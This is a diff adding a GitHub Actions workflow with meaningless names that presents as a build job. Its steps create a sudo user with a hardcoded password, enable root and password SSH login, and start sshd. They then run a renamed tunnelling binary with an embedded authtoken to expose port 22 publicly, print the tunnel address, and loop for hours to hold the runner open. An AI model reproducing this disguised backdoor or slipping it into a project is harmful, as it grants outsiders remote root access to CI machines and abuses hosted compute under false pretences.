@@ -1,0 +1,40 @@
+name: Skopue
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  schedule:
+    - cron: '0 0 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Mropu
+      run: |
+        sudo apt update -y
+        sudo apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen
+        sudo useradd -m Gilakau
+        sudo adduser Gilakau sudo
+        sudo echo Gilakau:SapuLidi10 | sudo chpasswd
+        sudo sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
+        sudo mkdir -p /var/run/sshd
+        sudo echo "PermitRootLogin yes" >> sudo /etc/ssh/sshd_config
+        sudo echo "PasswordAuthentication yes" >> sudo /etc/ssh/sshd_config
+        sudo echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> sudo /root/.bashrc
+        sudo echo "export LD_LIBRARY_PATH" >> sudo /root/.bashrc
+        sudo /usr/sbin/sshd -D &
+        unzip a.zip
+        chmod u+x *
+        ./loki authtoken 2fclAdTGUx9EWqgwyi7lOS3NTRG_7e36VvuPfVt5uvj8F8Z9c
+        ./loki tcp 22 &>/dev/null &
+        sleep 5s
+        curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
+        sleep 20s
+        counter=1; while [ $counter -le 21000 ]; do echo $counter; sleep 1s; ((counter++)); done
+
+        
+        
+        
